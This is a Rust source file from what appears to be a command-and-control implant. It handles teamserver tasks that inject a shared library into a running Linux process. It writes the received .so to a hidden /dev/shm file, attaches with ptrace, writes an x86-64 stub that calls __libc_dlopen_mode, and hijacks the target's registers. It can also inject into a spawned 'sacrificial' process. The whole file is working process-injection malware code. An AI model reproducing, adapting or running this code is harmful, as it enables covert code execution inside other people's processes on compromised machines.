use std::fs;
use std::process::Stdio;

use red_cell_common::demon::DemonCommand;
use tokio::process::Command;

use crate::command::PhantomState;
use crate::command::encode::encode_u32;
use crate::command::types::PendingCallback;
use crate::error::PhantomError;
use crate::parser::TaskParser;

use super::dlopen::{find_libc_base, resolve_dlopen_in_target};
use super::ptrace::{
    check_ptrace_permission, ptrace_mmap_page, ptrace_munmap_page, wait_for_sigtrap,
    write_to_proc_mem,
};
use super::{INJECT_ERROR_FAILED, INJECT_ERROR_SUCCESS};

/// Handle `CommandInjectDll` (ID 22): inject a shared library into a running process.
///
/// ## Packet format (from teamserver, little-endian)
///
/// | Field          | Type   | Description                              |
/// |----------------|--------|------------------------------------------|
/// | technique      | i32    | Injection technique (ignored on Linux)   |
/// | target_pid     | i32    | Target process ID                        |
/// | dll_ldr        | bytes  | Reflective loader (ignored on Linux)     |
/// | dll_bytes      | bytes  | The shared library (.so) binary          |
/// | parameter      | bytes  | Optional parameter string for the .so    |
///
/// On Linux the reflective loader is not used. Instead the .so bytes are
/// written to a temporary file, and `dlopen` is invoked on the target process
/// via ptrace to load it.
///
/// ## Response
///
/// `[status:u32]` — 0 = success, 1 = failure.
pub(super) async fn execute_inject_dll(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let _technique = parser.int32()?;
    let target_pid = parser.int32()?;
    let _dll_ldr = parser.bytes()?;
    let dll_bytes = parser.bytes()?.to_vec();
    let _parameter = parser.bytes()?.to_vec();

    tracing::debug!(target_pid, dll_size = dll_bytes.len(), "inject dll/so into process");

    let status = inject_so_into_pid(target_pid as u32, &dll_bytes).await;

    state.queue_callback(PendingCallback::Structured {
        command_id: u32::from(DemonCommand::CommandInjectDll),
        request_id,
        payload: encode_u32(status),
    });

    Ok(())
}

/// Handle `CommandSpawnDll` (ID 26): spawn a new process and inject a shared library.
///
/// ## Packet format (from teamserver, little-endian)
///
/// | Field      | Type   | Description                              |
/// |------------|--------|------------------------------------------|
/// | dll_ldr    | bytes  | Reflective loader (ignored on Linux)     |
/// | dll_bytes  | bytes  | The shared library (.so) binary          |
/// | arguments  | bytes  | Arguments / parameters for the .so       |
///
/// ## Response
///
/// `[status:u32]` — 0 = success, 1 = failure.
pub(super) async fn execute_spawn_dll(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let _dll_ldr = parser.bytes()?;
    let dll_bytes = parser.bytes()?.to_vec();
    let _arguments = parser.bytes()?.to_vec();

    tracing::debug!(dll_size = dll_bytes.len(), "spawn dll/so");

    let status = spawn_and_inject_so(&dll_bytes).await;

    state.queue_callback(PendingCallback::Structured {
        command_id: u32::from(DemonCommand::CommandSpawnDll),
        request_id,
        payload: encode_u32(status),
    });

    Ok(())
}

/// Inject a shared library into a target process.
async fn inject_so_into_pid(pid: u32, so_bytes: &[u8]) -> u32 {
    if so_bytes.is_empty() {
        tracing::warn!("empty .so payload");
        return INJECT_ERROR_FAILED;
    }

    let so_path = format!("/dev/shm/.phantom_{pid}_{}.so", std::process::id());
    if let Err(e) = fs::write(&so_path, so_bytes) {
        tracing::warn!(%e, "failed to write .so to /dev/shm");
        return INJECT_ERROR_FAILED;
    }

    if let Err(e) =
        fs::set_permissions(&so_path, std::os::unix::fs::PermissionsExt::from_mode(0o755))
    {
        tracing::warn!(%e, "failed to chmod .so");
        let _ = fs::remove_file(&so_path);
        return INJECT_ERROR_FAILED;
    }

    let status = inject_so_via_ptrace(pid, &so_path).await;

    let so_path_clone = so_path.clone();
    tokio::spawn(async move {
        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
        let _ = fs::remove_file(&so_path_clone);
    });

    status
}

/// Use ptrace to make a target process call `dlopen` on a shared library path.
async fn inject_so_via_ptrace(pid: u32, so_path: &str) -> u32 {
    let pid_i32 = pid as i32;

    if !check_ptrace_permission(pid) {
        tracing::warn!(pid, "ptrace not permitted (check /proc/sys/kernel/yama/ptrace_scope)");
        return INJECT_ERROR_FAILED;
    }

    // SAFETY: ptrace with valid PID. Return value checked.
    let ret = unsafe { libc::ptrace(libc::PTRACE_ATTACH, pid_i32, 0, 0) };
    if ret < 0 {
        tracing::warn!(pid, "ptrace ATTACH failed: {}", std::io::Error::last_os_error());
        return INJECT_ERROR_FAILED;
    }

    let mut wait_status: i32 = 0;
    // SAFETY: waitpid with valid PID.
    unsafe { libc::waitpid(pid_i32, &mut wait_status, 0) };

    let target_libc_base = match find_libc_base(pid) {
        Some(base) => base,
        None => {
            tracing::warn!(pid, "could not find libc base in target");
            // SAFETY: detach.
            unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
            return INJECT_ERROR_FAILED;
        }
    };

    let dlopen_addr = match resolve_dlopen_in_target(target_libc_base) {
        Some(addr) => addr,
        None => {
            tracing::warn!(pid, "could not resolve __libc_dlopen_mode");
            // SAFETY: detach.
            unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
            return INJECT_ERROR_FAILED;
        }
    };

    let mut orig_regs: libc::user_regs_struct = unsafe { std::mem::zeroed() };
    // SAFETY: PTRACE_GETREGS with valid pid.
    let ret = unsafe {
        libc::ptrace(
            libc::PTRACE_GETREGS,
            pid_i32,
            0,
            &mut orig_regs as *mut libc::user_regs_struct,
        )
    };
    if ret < 0 {
        tracing::warn!(pid, "ptrace GETREGS failed: {}", std::io::Error::last_os_error());
        // SAFETY: detach.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    let page_addr = match ptrace_mmap_page(pid, &orig_regs) {
        Some(addr) => addr,
        None => {
            tracing::warn!(pid, "failed to allocate mmap page in target");
            // SAFETY: detach.
            unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
            return INJECT_ERROR_FAILED;
        }
    };

    let path_offset: u64 = 256;
    let path_addr = page_addr + path_offset;
    let stub_addr = page_addr;

    let mut path_bytes = so_path.as_bytes().to_vec();
    path_bytes.push(0);
    if write_to_proc_mem(pid, path_addr, &path_bytes).is_err() {
        tracing::warn!(pid, "failed to write path to mmap page");
        ptrace_munmap_page(pid, &orig_regs, page_addr);
        // SAFETY: detach.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    let mut stub: Vec<u8> = Vec::new();
    stub.extend_from_slice(&[0x48, 0xbf]);
    stub.extend_from_slice(&path_addr.to_le_bytes());
    stub.extend_from_slice(&[0x48, 0xbe]);
    stub.extend_from_slice(&2_u64.to_le_bytes());
    stub.extend_from_slice(&[0x48, 0xb8]);
    stub.extend_from_slice(&dlopen_addr.to_le_bytes());
    stub.extend_from_slice(&[0xff, 0xd0]);
    stub.push(0xcc);

    if write_to_proc_mem(pid, stub_addr, &stub).is_err() {
        tracing::warn!(pid, "failed to write dlopen stub to mmap page");
        ptrace_munmap_page(pid, &orig_regs, page_addr);
        // SAFETY: detach.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    let mut new_regs = orig_regs;
    new_regs.rip = stub_addr;
    new_regs.rsp = (page_addr + 4096) & !0xf;

    // SAFETY: PTRACE_SETREGS with valid pid.
    let ret = unsafe {
        libc::ptrace(libc::PTRACE_SETREGS, pid_i32, 0, &new_regs as *const libc::user_regs_struct)
    };
    if ret < 0 {
        tracing::warn!(pid, "ptrace SETREGS failed: {}", std::io::Error::last_os_error());
        ptrace_munmap_page(pid, &orig_regs, page_addr);
        // SAFETY: detach.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    // SAFETY: PTRACE_CONT with valid pid.
    unsafe { libc::ptrace(libc::PTRACE_CONT, pid_i32, 0, 0) };

    if !wait_for_sigtrap(pid_i32) {
        tracing::warn!(pid, "tracee did not reach SIGTRAP after dlopen stub (exited or killed)");
        ptrace_munmap_page(pid, &orig_regs, page_addr);
        // SAFETY: PTRACE_DETACH with valid pid.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    // Read RAX — the __libc_dlopen_mode return value (NULL = failure).
    let mut post_regs: libc::user_regs_struct = unsafe { std::mem::zeroed() };
    let gr = unsafe {
        libc::ptrace(
            libc::PTRACE_GETREGS,
            pid_i32,
            0,
            &mut post_regs as *mut libc::user_regs_struct,
        )
    };
    if gr < 0 {
        tracing::warn!(
            pid,
            "ptrace GETREGS after dlopen stub failed: {}",
            std::io::Error::last_os_error()
        );
        ptrace_munmap_page(pid, &orig_regs, page_addr);
        // SAFETY: PTRACE_DETACH with valid pid.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }
    if post_regs.rax == 0 {
        tracing::warn!(
            pid,
            %so_path,
            "__libc_dlopen_mode returned NULL (path missing, not executable, or bad dependency chain)"
        );
        ptrace_munmap_page(pid, &orig_regs, page_addr);
        // SAFETY: PTRACE_SETREGS with valid pid and original register state.
        unsafe {
            libc::ptrace(
                libc::PTRACE_SETREGS,
                pid_i32,
                0,
                &orig_regs as *const libc::user_regs_struct,
            );
        }
        // SAFETY: PTRACE_DETACH with valid pid.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    ptrace_munmap_page(pid, &orig_regs, page_addr);

    // SAFETY: PTRACE_SETREGS with valid pid and original register state.
    unsafe {
        libc::ptrace(libc::PTRACE_SETREGS, pid_i32, 0, &orig_regs as *const libc::user_regs_struct)
    };

    // SAFETY: PTRACE_DETACH with valid pid.
    unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };

    tracing::info!(pid, so_path, "shared library injected via ptrace");
    INJECT_ERROR_SUCCESS
}

/// Spawn a sacrificial process and inject a shared library into it.
async fn spawn_and_inject_so(so_bytes: &[u8]) -> u32 {
    if so_bytes.is_empty() {
        tracing::warn!("empty .so payload");
        return INJECT_ERROR_FAILED;
    }

    let child = match Command::new("/bin/sh")
        .args(["-c", "kill -STOP $$ ; exec sleep infinity"])
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => {
            tracing::warn!(%e, "failed to spawn sacrificial process");
            return INJECT_ERROR_FAILED;
        }
    };

    let Some(child_pid) = child.id() else {
        tracing::warn!("failed to get child PID");
        return INJECT_ERROR_FAILED;
    };

    inject_so_into_pid(child_pid, so_bytes).await
}
